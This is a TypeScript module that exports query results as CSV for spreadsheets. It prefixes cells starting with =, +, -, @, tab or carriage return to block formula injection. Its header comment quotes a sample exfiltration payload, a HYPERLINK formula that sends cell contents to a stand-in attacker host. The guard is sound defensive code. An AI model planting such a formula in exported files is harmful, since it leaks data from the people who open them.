/**
 * Export a result as CSV (RFC 4180), safe to open in Excel or Google Sheets.
 *
 * CSV/formula injection: a spreadsheet runs a cell that starts with = + - @ as a formula. Our
 * rows come from the database and our column names from the LLM's SQL, so a value like
 * `=HYPERLINK("http://evil.example?"&A1)` could leak data or run commands when someone opens the
 * file. Text that starts with one of those characters gets a leading ' (shown as text, not run).
 * Real numbers are left alone: -5 stays a number.
 */

// Tab and carriage return too: some spreadsheets skip them and then read the formula (OWASP).
const FORMULA_START = /^[=+\-@\t\r]/
const NEEDS_QUOTES = /[",\r\n]/

/** One CSV field: guarded against formulas, then quoted if it holds a comma, quote or line break. */
export function csvField(value: unknown): string {
  if (value === null || value === undefined) return ''
  if (typeof value === 'number' || typeof value === 'boolean') return String(value)
  let text = typeof value === 'string' ? value : JSON.stringify(value)
  // The guard comes first, so the ' ends up inside the quotes.
  if (FORMULA_START.test(text)) text = `'${text}`
  return NEEDS_QUOTES.test(text) ? `"${text.replaceAll('"', '""')}"` : text
}

/** The header row, then one line per row, each line ending in CRLF (RFC 4180). */
export function toCsv(columns: readonly string[], rows: readonly (readonly unknown[])[]): string {
  return [columns, ...rows].map((row) => `${row.map(csvField).join(',')}\r\n`).join('')
}

/** A file name from the question: "Sales per category?" → "sales-per-category.csv". */
export function csvFileName(question: string): string {
  const slug = question
    .toLowerCase()
    .replaceAll(/[^a-z0-9]+/g, '-')
    .replaceAll(/^-+|-+$/g, '')
    .slice(0, 60)
    .replace(/-+$/, '')
  return `${slug || 'result'}.csv`
}

/** Save the CSV through the browser's download, without a server round trip. */
export function downloadCsv(fileName: string, csv: string): void {
  // The byte-order mark (BOM) tells Excel the file is UTF-8, so "Café" isn't shown as "CafÃ©".
  const blob = new Blob(['﻿', csv], { type: 'text/csv;charset=utf-8' })
  const url = URL.createObjectURL(blob)
  const link = document.createElement('a')
  link.href = url
  link.download = fileName
  link.click()
  // Freed a moment later: some browsers start reading the file only after click() returns.
  setTimeout(() => URL.revokeObjectURL(url), 1000)
}
